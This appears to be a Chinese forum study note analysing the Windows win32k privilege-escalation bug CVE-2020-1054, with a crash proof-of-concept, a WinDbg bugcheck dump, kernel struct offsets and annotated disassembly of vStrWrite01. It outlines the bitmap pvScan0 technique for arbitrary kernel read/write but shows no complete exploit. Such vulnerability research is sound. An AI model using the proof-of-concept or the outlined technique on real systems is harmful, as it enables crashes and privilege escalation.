
# [原创]CVE-2020-1054提权漏洞学习笔记

## 一.前言

### 1.漏洞描述

该漏洞存在于`win32k!vStrWrite01`函数中，该函数在对`BitMap`对象中`pvScan0`成员所指向的像素区域进行读写的时候，没有判断读写的地址是否已经越界，即超过了`BitMap`对象的像素点范围，导致`BSOD`的产生。通过合理的内存布局，可以利用该漏洞扩大目标`BitMap`对象的`sizlBitmap`来扩大该`BitMap`对象的可读写范围，利用此时被扩大读写范围的`BitMap`对象来修改另一个`BitMap`对象的`pvScan0`就可以实现任意地址读写。

### 2.实验环境

- **操作系统：**Win7 x64 7601 专业版

- **编译器：**Visual Studio 2017

- **调试器：**IDA Pro, WinDbg

## 二.漏洞分析

### 1.POC代码分析

该漏洞的`POC`代码如下：

```
VOID POC_CVE_2020_1054()

{

	LoadLibrary("user32.dll");

	HDC r0 = CreateCompatibleDC(0x0);

	// CPR's original crash code called CreateCompatibleBitmap as follows

	// HBITMAP r1 = CreateCompatibleBitmap(r0, 0x9f42, 0xa);

	// however all following calculations/reversing in this blog will

	// generally use the below call, unless stated otherwise

	// this only matters if you happen to be following along with WinDbg

	HBITMAP r1 = CreateCompatibleBitmap(r0, 0x51500, 0x100);

	SelectObject(r0, r1);

	DrawIconEx(r0, 0x0, 0x0, (HICON)0x30000010003, 0x0, 0xfffffffffebffffc,

				0x0, 0x0, 0x6);

}
```

`POC`代码通过`CreateComatibleBitmap`对象来创建了一个`BitMap`对象用来触发漏洞，该函数定义如下：

```
HBITMAP CreateCompatibleBitmap(HDC hdc,

  			       int nWidth,    

  			       int nHeight);
```

漏洞触发函数则是`DrawIconEx`，该函数用于在指定的设备上下文中绘制图像，该函数定义如下：

```
BOOL WINAPI DrawIconEx(HDC hdc,

    		       int xLeft,

   		       int yTop,

    		       HICON hIcon,

    		       int cxWidth,

                       int cyWidth,

                       UINT istepIfAniCur,

                       HBRUSH hbrFlickerFreeDraw,

                       UINT diFlags);
```

编译运行`POC`，系统就会产生`BSOD`错误，以下的部分错误信息：

```
0: kd> !analyze -v

Connected to Windows 7 7601 x64 target at (Tue Jul 12 10:00:11.147 2022 (UTC + 8:00)), ptr64 TRUE

*******************************************************************************

*                                                                             *

*                        Bugcheck Analysis                                    *

*                                                                             *

*******************************************************************************



PAGE_FAULT_IN_NONPAGED_AREA (50)

Invalid system memory was referenced.  This cannot be protected by try-except.

Typically the address is just plain bad or it is pointing at freed memory.

Arguments:

Arg1: fffff906c5000238, memory referenced.

Arg2: 0000000000000000, value 0 = read operation, 1 = write operation.

Arg3: fffff9600011218a, If non-zero, the instruction address which referenced the bad memory

	address.

Arg4: 0000000000000005, (reserved)



Debugging Details:

------------------



IMAGE_NAME:  win32k.sys



TRAP_FRAME:  fffff88005386a40 -- (.trap 0xfffff88005386a40)

NOTE: The trap frame does not contain all registers.

Some register values may be zeroed or incorrect.

rax=fffff900c5000000 rbx=0000000000000000 rcx=fffff906c5000238

rdx=fffff900c06f7fa0 rsi=0000000000000000 rdi=0000000000000000

rip=fffff9600011218a rsp=fffff88005386bd0 rbp=0000000000000000

 r8=0000000000000020  r9=fffff96000070000 r10=fffff88005386c30

r11=0000000000000000 r12=0000000000000000 r13=0000000000000000

r14=0000000000000000 r15=0000000000000000

iopl=0         nv up ei ng nz na po cy

win32k!vStrWrite01+0x36a:

fffff960`0011218a 418b36          mov     esi,dword ptr [r14] ds:00000000`00000000=????????



STACK_TEXT:  

nt!RtlpBreakWithStatusInstruction

nt!KiBugCheckDebugBreak+0x12

nt!KeBugCheck2+0x71e

nt!KeBugCheckEx+0x104

nt! ?? ::FNODOBFM::`string'+0x44891

nt!KiPageFault+0x16e

win32k!vStrWrite01+0x36a

win32k!EngStretchBltNew+0x164a

win32k!EngStretchBlt+0x797

win32k!EngStretchBltROP+0x5fe

win32k!BLTRECORD::bStretch+0x623

win32k!GreStretchBltInternal+0xa37

win32k!BltIcon+0x18f

win32k!DrawIconEx+0x3b1

win32k!NtUserDrawIconEx+0x14d

nt!KiSystemServiceCopyEnd+0x13

USER32!NtUserDrawIconEx+0xa

USER32!DrawIconEx+0xd9
```

根据错误信息可以知道，产生`BSOD`错误的代码地址位于`win32k!vStrWrite01`偏移`0x36A`处，产生原因是对不合法的地址，即`0`地址进行读取操作。

### 2.vStrWrite01函数分析

在`NT4`源码中可以找到`vStrWrite01`函数的定义如下：

```
VOID vStrWrite01(STRRUN  *prun, 

                 XRUNLEN *pxrlEnd,

                 SURFACE *pSurf,

                 CLIPOBJ *pco)
```

其中，与漏洞相关的前三个参数定义如下：

```
typedef struct _XRUNLEN

{

    LONG    xPos;

    LONG    cRun;

    LONG    aul[1];

} XRUNLEN;



typedef struct _STRRUN

{

    LONG    yPos;

    LONG    cRep;

    XRUNLEN xrl;

} STRRUN;





typedef struct tagSIZE {

    LONG cx;

    LONG cy;

} SIZE,*PSIZE,*LPSIZE;

 

typedef SIZE SIZEL;



typedef struct _BASEOBJECT64{

  ULONG64 hHmgr;		// 0x00

  ULONG32 ulShareCount;		// 0x08

  WORD cExclusiveLock;		// 0x0A

  WORD BaseFlags;		// 0x0C

  ULONG64 Tid;			// 0x10

} BASEOBJECT64;

 

typedef struct _SURFOBJ64{

  BASEOBJECT64 baseObj;	  // 0x00

  ULONG64 dhsurf;         // 0x18

  ULONG64 hsurf;          // 0x20

  ULONG64 dhpdev;         // 0x28

  ULONG64 hdev;           // 0x30

  SIZEL sizlBitmap;       // 0x38

  ULONG64 cjBits;         // 0x40

  ULONG64 pvBits;         // 0x48

  ULONG64 pvScan0;        // 0x50

  ULONG32 lDelta;         // 0x58

  ULONG32 iUniq;          // 0x5C

  ULONG32 iBitmapFormat;  // 0x60

  USHORT iType;           // 0x64

  USHORT fjBitmap;        // 0x66

} SURFOBJ64;
```

根据`WinDbg`的错误信息可以在`IDA`中定位到触发错误的代码，在触发错误的代码上面不远处就可以看到，读取的内存地址由`rcx`与`rax`决定，所以就需要分析`rcx`与`rax`的计算才能知道读取的内存地址。

![](https://bbs.kanxue.com/upload/attach/202207/835440_RWHYWRT2EPHFA8V.jpg)

在`vStrWrite01`函数首先对参数进行赋值，并判断相关参数是否条件，这里的三个跳转都不会进行：

```
.text:FFFFF97FFF0A5118 ; void __fastcall vStrWrite01(struct _STRRUN *prun, struct _XRUNLEN *pxrlEnd, struct SURFACE *pSurf, struct _CLIPOBJ *pco)

.text:FFFFF97FFF0A5118 ?vStrWrite01@@YAXPEAU_STRRUN@@PEAU_XRUNLEN@@PEAVSURFACE@@PEAU_CLIPOBJ@@@Z proc near

.text:FFFFF97FFF0A5118                 test    rdx, rdx       ; 判断pxrlEnd是否为NULL

.text:FFFFF97FFF0A511B                 jz      locret_FFFFF97FFF0A560E

.text:FFFFF97FFF0A5143                 lea     rax, [rcx+8]    ; eax = prun->xrl

.text:FFFFF97FFF0A5147                 mov     rbx, r9         ; rbx = pco

.text:FFFFF97FFF0A514A                 mov     r15, r8         ; r15 = pSurf

.text:FFFFF97FFF0A5152                 mov     rdi, rax        ; rdi = prun->xrl

.text:FFFFF97FFF0A515A                 mov     rsi, rcx        ; rsi = prun

.text:FFFFF97FFF0A515D                 test    rbx, rbx        ; poc是否为NULL

.text:FFFFF97FFF0A5160                 jnz     loc_FFFFF97FFF0A53AC

.text:FFFFF97FFF0A53C7                 mov     ebp, [rsi]      ; ebp = prun->yPos

.text:FFFFF97FFF0A53DE                 mov     r11d, [rsi+4]   ; r11d = prun->xrl->cRun

.text:FFFFF97FFF0A53FA                 mov     eax, [r15+58h]  ; eax = pSurf->lDelta

.text:FFFFF97FFF0A53FE                 imul    eax, ebp        ; eax = pSurf->lDelta * prun->yPos

.text:FFFFF97FFF0A5401                 movsxd  rcx, eax        ; rcx = pSurf->lDelta * prun->yPos

.text:FFFFF97FFF0A5404                 add     rcx, [r15+50h]  ; rcx = pSurf->lDelta * prun->yPos + pSurf->pvScan0

.text:FFFFF97FFF0A5408                 mov     [rsp+0A8h+var_rcx], rcx ; 保存rcx的数值

.text:FFFFF97FFF0A540D                 test    r11d, r11d      ; 判断prun->yPos是否为0

.text:FFFFF97FFF0A5410                 jz      loc_FFFFF97FFF0A55F7
```

将`r11d`减一，也就是将保持的`prun->xrl->cRun`减一，之后就开始计算`rcx`和`rax`，在用`rcx`和`rax`来计算`r14`，即计算之后要读取的内存地址：

```
.text:FFFFF97FFF0A541D                 mov     r12d, 1

.text:FFFFF97FFF0A5423 loc_FFFFF97FFF0A5423:                   

.text:FFFFF97FFF0A5423                 sub     r11d, r12d      ; r11d = r11d - 1

.text:FFFFF97FFF0A5450                 movsxd  rbx, dword ptr [rdi] ; rbx = prun->xrl->xPos

.text:FFFFF97FFF0A545A                 mov     rax, rbx        ; rax = prun->xrl->xPos

.text:FFFFF97FFF0A5460                 sar     rax, 5          ; rax = prun->xrl->xPos >> 5

.text:FFFFF97FFF0A546D                 lea     r14, [rcx+rax*4]
```

接下去执行就是导致`BSOD`错误产生的`mov esi, [r14]`这条指令。 如果`r14`中保持地址是合法的地址，之后就会对读取到的值进行`or`运算或者`and`运算：

![](https://bbs.kanxue.com/upload/attach/202207/835440_6S46EY8WTX2ZT97.jpg)
